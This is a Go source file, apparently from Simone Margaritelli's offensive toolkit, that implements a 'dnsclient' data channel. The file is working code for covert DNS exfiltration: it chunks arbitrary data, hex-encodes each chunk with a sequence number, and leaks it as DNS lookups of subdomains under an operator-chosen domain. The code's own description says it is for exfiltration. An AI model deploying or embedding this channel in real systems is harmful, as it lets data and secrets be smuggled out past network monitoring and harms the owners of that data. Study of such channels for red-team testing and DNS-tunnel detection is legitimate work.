/*
* Copyleft 2017, Simone Margaritelli <evilsocket at protonmail dot com>
* Redistribution and use in source and binary forms, with or without
* modification, are permitted provided that the following conditions are met:
*
*   * Redistributions of source code must retain the above copyright notice,
*     this list of conditions and the following disclaimer.
*   * Redistributions in binary form must reproduce the above copyright
*     notice, this list of conditions and the following disclaimer in the
*     documentation and/or other materials provided with the distribution.
*   * Neither the name of ARM Inject nor the names of its contributors may be used
*     to endorse or promote products derived from this software without
*     specific prior written permission.
*
* THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
* AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
* IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
* ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE
* LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
* CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
* SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
* INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
* CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
* ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
* POSSIBILITY OF SUCH DAMAGE.
 */
package channels

import (
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"github.com/miekg/dns"
	"net"
	"os"
	"strings"
)

const DNSChunkSize = 16

type DNSClient struct {
	domain   string
	resolver string
	client   *dns.Client
	seqn     uint32
}

func NewDNSClientChannel() *DNSClient {
	return &DNSClient{
		domain:   "",
		resolver: "",
		client:   nil,
		seqn:     0,
	}
}

func (c *DNSClient) Name() string {
	return "dnsclient"
}

func (c *DNSClient) Description() string {
	return "Write data as DNS queries ( example: dnsclient:example.com will use <hex sequence number + hex chunk>.example.com for exfiltration )."
}

func (c *DNSClient) SetArgs(args string) error {
	if strings.Contains(args, "@") {
		parts := strings.SplitN(args, "@", 2)
		if len(parts) != 2 {
			return fmt.Errorf("Could not parse domain@resolver from dnsclient arguments.")
		}

		c.domain = parts[0]
		c.resolver = parts[1]
		c.client = new(dns.Client)

	} else {
		c.domain = args
		c.resolver = ""
		c.client = nil
	}

	return nil
}

func (c *DNSClient) HasReader() bool {
	return false
}

func (c *DNSClient) Read(b []byte) (n int, err error) {
	return 0, fmt.Errorf("dnsclient can't be used for reading.")
}

func (c *DNSClient) HasWriter() bool {
	return true
}

func (c *DNSClient) Lookup(fqdn string) {
	fmt.Fprintf(os.Stderr, "Resolving %s (seqn=0x%x) ...\n", fqdn, c.seqn)

	if c.client == nil {
		net.LookupHost(fqdn)
	} else {
		m1 := new(dns.Msg)
		m1.Id = dns.Id()
		m1.RecursionDesired = true
		m1.Question = make([]dns.Question, 1)
		m1.Question[0] = dns.Question{fqdn + ".", dns.TypeA, dns.ClassINET}

		if _, _, err := c.client.Exchange(m1, c.resolver); err != nil {
			fmt.Println(err)
		}
	}
}

func (c *DNSClient) Write(b []byte) (n int, err error) {
	// fmt.Printf("Writing %d bytes: '%s' -> %s...\n", len(b), string(b), hex.EncodeToString(b))

	total_size := len(b)
	left := total_size
	done := 0

	for left > 0 {
		size := DNSChunkSize
		if left < size {
			size = left
		}

		// fmt.Printf("  chunk := b[%d:%d]\n", done, size)
		chunk := b[done : done+size]
		// add padding
		if size < DNSChunkSize {
			// fmt.Printf("    padding\n")
			pad := size
			for pad < DNSChunkSize {
				chunk = append(chunk, 0x00)
				pad++
			}
		}

		seqn_buffer := make([]byte, 4)
		binary.BigEndian.PutUint32(seqn_buffer, c.seqn)

		chunk = append(seqn_buffer, chunk...)

		fqdn := fmt.Sprintf("%s.%s", hex.EncodeToString(chunk), c.domain)

		c.Lookup(fqdn)

		done += size
		left -= size
		c.seqn++
	}

	return done, nil
}
